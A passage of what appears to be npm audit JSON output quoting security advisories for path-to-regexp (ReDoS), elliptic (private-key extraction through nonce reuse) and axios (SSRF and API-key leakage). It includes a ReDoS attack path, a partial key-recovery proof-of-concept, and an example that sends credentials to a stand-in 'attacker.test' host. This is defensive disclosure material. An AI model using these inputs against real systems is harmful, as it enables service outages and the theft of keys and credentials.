For example, `/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)\n- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)\n- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)\n- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `/:a-:b` will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n*

upon signing a malformed input (e.g. a string or a number), which could e.g. come from JSON network input\n\nNote that `elliptic` by design accepts hex strings as one of the possible input types\n\n### Details\n\nIn this code: https://github.com/indutny/elliptic/blob/3e46a48fdd2ef2f89593e5e058d85530578c9761/lib/elliptic/ec/index.js#L100-L107\n\n`msg` is a BN instance after conversion, but `nonce` is an array, and different BN instances could generate equivalent arrays after conversion.\n\nMeaning that a same `nonce` could be generated for different messages used in signing process, leading to `k` reuse, leading to private key extraction from a pair of signatures\n\nSuch a message can be constructed for any already known message/signature pair, meaning that the attack needs only a single malicious message being signed for a full key extraction\n\nWhile signing unverified attacker-controlled messages would be problematic itself (and exploitation of this needs such a scenario), signing a single message still _should not_ leak the private key\n\nAlso, message validation could have the same bug (out of scope for this report, but could be possible in some situations), which makes this attack more likely when used in a chain\n\n### PoC\n\n#### `k` reuse example\n\n```js\nimport elliptic from 'elliptic'\n\nconst { ec: EC } = elliptic\n\nconst privateKey = crypto.getRandomValues(new Uint8Array(32))\nconst curve = 'ed25519' // or any other curve, e.g. secp256k1\nconst ec = new EC(curve)\nconst prettyprint = ({ r, s }) => `r: ${r}, s: ${s}`\nconst sig0 = prettyprint(ec.sign(Buffer.alloc(32, 1), privateKey)) // array of ones\nconst sig1 = prettyprint(ec.sign('01'.repeat(32), privateKey)) // same message in hex form\nconst sig2 = prettyprint(ec.sign('-' + '01'.repeat(32), privateKey)) // same `r`, different `s`\nconsole.log({ sig0, sig1, sig2 })\n```\n\n#### Full attack\n\nThis doesn't include code for generation/recovery on a purpose (bit it's rather trivial)\n\n```js\nimport elliptic from 'elliptic'\n\nconst { ec: EC } = elliptic\n\nconst privateKey = crypto.getRandomValues(new Uint8Array(32))\nconst curve = 'secp256k1' // or any other curve, e.g. ed25519\nconst ec = new EC(curve)\n\n// Any message, e.g. previously known signature\nconst msg0 = crypto.getRandomValues(new Uint8Array(32))\nconst sig0 = ec.sign(msg0, privateKey)\n\n// Attack\nconst msg1 = funny(msg0) // this is a string here, but can also be of other non-Uint8Array types\nconst sig1 = ec.sign(msg1, privateKey)\n\nconst something = extract(msg0, sig0, sig1, curve)\n\nconsole.log('Curve:', curve)\nconsole.log('Typeof:', typeof msg1)\nconsole.log('Keys equal?', Buffer.from(privateKey).toString('hex') === something)\nconst rnd = crypto.getRandomValues(new Uint8Array(32))\nconst st = (x) => JSON.stringify(x)\nconsole.log('Keys equivalent?', st(ec.sign(rnd, something).toDER()) === st(ec.sign(rnd, privateKey).toDER()))\nconsole.log('Orig key:', Buffer.from(privateKey).toString('hex'))\nconsole.log('Restored:', something)\n```\n\nOutput:\n```console\nCurve: secp256k1\nTypeof: string\nKeys equal? true\nKeys equivalent? true\nOrig key: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a\nRestored: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a\n```\n\nSimilar for `ed25519`, but due to low `n`, the key might not match precisely but is nevertheless equivalent for signing:\n```console\nCurve: ed25519\nTypeof: string\nKeys equal? false\nKeys equivalent? true\nOrig key: f1ce0e4395592f4de24f6423099e022925ad5d2d7039b614aaffdbb194a0d189\nRestored: 01ce0e4395592f4de24f6423099e0227ec9cb921e3b7858581ec0d26223966a6\n```\n`restored` is equal to `orig` mod `N`.\n\n###

Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.","reported_by":null,"title":"axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL","metadata":null,"cves":["CVE-2025-27152"],"access":"public","severity":"high","module_name":"axios","vulnerable_versions":"<0.30.0","github_advisory_id":"GHSA-jr5f-v2jv-69x6","recommendation":"Upgrade to version 0.30.0 or later","patched_versions":">=0.30.0","updated":"2025-03-28T14:57:53.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-918"],"url":"https://github.com/advisories/GHSA-jr5f-v2jv-69x6"}},"muted":[],"metadata":{"vulnerabilities":{"info":0,"low":15,"moderate":15,"high":18,"critical":1},"dependencies":1139,"devDependencies":0,"optionalDependencies":0,"totalDependencies":1139}}
